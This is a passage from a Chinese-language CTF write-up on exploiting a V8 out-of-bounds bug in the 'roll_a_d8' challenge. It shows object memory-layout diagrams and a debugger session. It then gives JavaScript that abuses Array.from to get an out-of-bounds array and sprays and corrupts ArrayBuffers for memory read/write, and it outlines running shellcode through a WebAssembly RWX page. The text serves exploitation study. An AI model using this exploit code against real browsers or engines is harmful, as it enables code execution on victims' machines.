
```bash
0x0+-----------------------+
|kMapOffset |
0x8+-----------------------+
|kPropertiesOffset |
0x10+-----------------------+
|kElementsOffset |
0x18+-----------------------+
|kByteLengthOffset | +--------------+
0x20+-----------------------+ | |
|kBackingStoreOffset +-------------------->+ heap chunk |
0x28+-----------------------+ | |
|kAllocationBaseOffset | +--------------+
0x30+-----------------------+
|kAllocationLengthOffset|
0x38+-----------------------+
|kBitFieldSlot |
0x40+-----------------------+
```

```c++
# dylan @ eureka in ~/v8\_pwn/roll\_a\_d8 [12:30:48]
$ cat test.js
let oob = new ArrayBuffer(0x10);
%DebugPrint(oob);
%SystemBreak();
pwndbg> job 0x2310b90d4c1
0x2310b90d4c1: [JSArrayBuffer]
- map: 0x334e30303fe9 <Map(HOLEY\_ELEMENTS)> [FastProperties]
- prototype: 0x28fb71992981 <Object map = 0x334e30304041>
- elements: 0x352a58c82251 <FixedArray[0]> [HOLEY\_ELEMENTS]
- embedder fields: 2
- backing\_store: 0x5607bc964ce0
- byte\_length: 16
- neuterable
- properties: 0x352a58c82251 <FixedArray[0]> {}
- embedder fields = {
(nil)
(nil)
}
pwndbg> vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x5607bc962000 0x5607bca0f000 rw-p ad000 0 [heap]
```

## OOB 利用原理

也就是说，只要我们可以通过`OOB`修改了`ArrayBuffer->kBackingStoreOffset`，就可以随意操作`JSArrayBuffer`指向的内存了。不过，`ArrayBuffer`是不能直接操作的，我们需要通过`TypedArray`来进行数据访问，示意图如下：

```bash
JSArray
0x0+-----------------------+
|kMapOffset |
0x8+-----------------------+
|kPropertiesOffset |
0x10+-----------------------+
|kElementsOffset +------+
0x18+-----------------------+ |
|kLengthOffset | |
0x20+-----------------------+ |
|
JSFixedArray |
0x0+-----------------------+<-----+
|kMapOffset |
0x8+-----------------------+
|kLengthOffset |
0x10+-----------------------+
|element 0 |
0x18+-----------------------+
|element 1 | JSTypedArray
0x20+-----------------------+ 0x0+-----------------------+
|element 2 | |kMapOffset\* |
0x28+-----------------------+ 0x8+-----------------------+
+--------+... | |kPropertiesOffest\* |
| +-----------------------+ 0x10+-----------------------+
| |kElementsOffset\* |
| JSArrayBuffer 0x18+-----------------------+
| 0x0+-----------------------+<--------------------------------+kBufferOffset\* |
| |kMapOffset | 0x20+-----------------------+
OOB| 0x8+-----------------------+ |kByteOffsetOffset |
| |kPropertiesOffset | 0x28+-----------------------+
| x10+-----------------------+ |kByteLengthOffset |
| |kElementsOffset | 0x30+-----------------------+
| x18+-----------------------+ |kViewSize\* |
| |kByteLengthOffset | +--------------+ 0x38+-----------------------+
| x20+-----------------------+ | | |kLengthOffset |
+------->+kBackingStoreOffset +----->+ heap chunk | 0x40+-----------------------+
x28+-----------------------+ | |
|kAllocationBaseOffset | +--------------+
0x30+-----------------------+
|kAllocationLengthOffset|
0x38+-----------------------+
|kBitFieldSlot |
0x40+-----------------------+
```

接着要思考如何把`ArrayBuffer`放置到我们的`oobarray`之后，我们申请大量的带有特征值的`ArrayBuffer`，再通过`oobarray`来搜索特征值，就可以找到可用的`ArrayBuffer`。另外当前版本的`ArrayBuffer`只能用`Float64Array`来读写八字节的内存单元，所以我们不仅要在数组中定义浮点数，还要实现`Float64`和`Uint64`的转换。部分代码如下：

```javascript
let arrayBuffers = [];
let oobArray = [1.1];
let maxSize = 1028 \* 8;
function hex(x) //打印16进制
{
return '0x' + (x.toString(16)).padStart(16, 0);
}
class Memory{
constructor(){
this.buf = new ArrayBuffer(8);
this.f64 = new Float64Array(this.buf);
this.u32 = new Uint32Array(this.buf);
this.bytes = new Uint8Array(this.buf);
}
f2i(val){ //double ==> Uint64
this.f64[0] = val;
let tmp = Array.from(this.u32);
return tmp[1] \* 0x100000000 + tmp[0];
}
i2f(val){ //Uint64 ==> double
let tmp = [];
tmp[0] = parseInt(val % 0x100000000);
tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
this.u32.set(tmp);
return this.f64[0];
}
}
var mem = new Memory();
// Array.from() 方法从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。
// call() 方法使用一个指定的 this 值和单独给出的一个或多个参数来调用一个函数。
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : \_ => (
{
// 自己实现的迭代器
counter : 0,
next() {
let result = 1.1;
this.counter++;
if (this.counter > maxSize) {
// 迭代结束之后将length置1，避免被回收
oobArray.length = 1;
// 堆风水，0xc00c为特殊值，方便搜索
for (let i = 0;i < 100;i++) {
arrayBuffers.push(new ArrayBuffer(0xc00c));
}
return {done: true};
} else {
return {value: result, done: false};
}
}
}
) });
// 搜索oobArray之后是否存在可用的ArrayBuffer，
let kBackingStoreOffset = 0;
for(let i = 0; i < maxSize; i++){
let val = mem.f2i(oobArray[i]);
if(val === 0xc00c00000000){
console.log("[\*]find target ArrayBuffer at oobArray[" + i.toString() + "]");
kBackingStoreOffset = i + 1;
oobArray[i] = mem.i2f(0x0cc000000000); //修改可控buf的length，做个标记
oobArray[i + 3] = mem.i2f(0x0cc0); //有两处保存了length值
break;
}
}
// arrayBuffers中的第i个buf是可控的
let controllable\_buf\_idx = 0;
for(let i = 0; i < arrayBuffers.length; i++){
let val = arrayBuffers[i].byteLength;
if(val === 0x0cc0){ //查找被修改了length的buf
console.log("[\*]find target ArrayBuffer at arrayBuffers[" + i.toString() + "]");
controllable\_buf\_idx = i;
break;
}
}
```

除了`ArrayBuffer`之外，我们还可以在`oobArray`之后布置普通对象，如果将目标对象绑定到普通对象的`in-object属性`，那么就可以通过`oobArray`的越界读来泄露目标对象的所在地址，关于布置和查找的方法和`ArrayBuffer`是一样的。

## 任意代码执行

除常规的`linux`利用手法之外，其实我们还可以通过`WebAssembly`来进行任意代码执行，这个网站可能会帮到你。具体步骤如下：

1. 创建一个`wasm`函数对象，`wasm`本身只能进行诸如数学运算这样的操作，所以随便创建一个就行。
2. 通过地址泄露原语找到`wasm`自带的`RWX`属性页及`wasm`函数最终会调用的汇编代码（`wasmInstance.exports.main -> shared_info -> data -> instance+XX`）。
3. 通过任意地址读写原语修改`wasm`所在内存页，换上我们准备好的`shellcode`。
4. 调用`wasm`函数接口，执行`shellcode`。

代码如下：
